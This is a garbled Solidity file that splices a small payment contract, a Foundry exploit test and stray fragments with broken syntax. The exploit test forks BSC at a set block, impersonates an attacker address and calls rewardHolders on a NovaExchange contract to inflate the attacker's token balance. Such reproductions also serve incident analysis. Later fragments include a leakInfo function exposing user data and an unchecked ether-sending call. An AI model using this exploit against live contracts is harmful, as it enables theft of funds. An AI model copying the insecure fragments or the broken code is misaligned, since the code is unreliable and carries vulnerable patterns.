
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

```solidity;

;
;
interface INovaExchange {
    function rewardHolders(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint value) external returns (bool)};
contract ContractTest is DSTest {
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  INovaExchange novaContract = INovaExchange(0xB5B27564D05Db32CF4F25813D35b6E6de9210941);
  address attacker = 0xCBF184b8156e1271449CFb42A7D0556A8DCFEf72;
  IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
  IPancakeRouter wbnb_nova =  IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
  function setUp() public {
    cheats.createSelectFork("bsc", 23749678)};
  function testExploit() public {
        emit log_named_uint("Before exploit, NOVA balance of attacker:",
          novaContract.balanceOf(attacker));
        cheats.prank(attacker);
        novaContract.rewardHolders(1000000000000000000);
        emit log_named_uint("After exploit,  NOVA balance of attacker:",
          novaContract.balanceOf(attacker));
function leakInfo() public view returns (string memory) {
    return userInfo[msg.sender];}
function getBonus() public {
    require(eligible[msg.sender]);
    msg.sender.call{value: 1 ether}("")}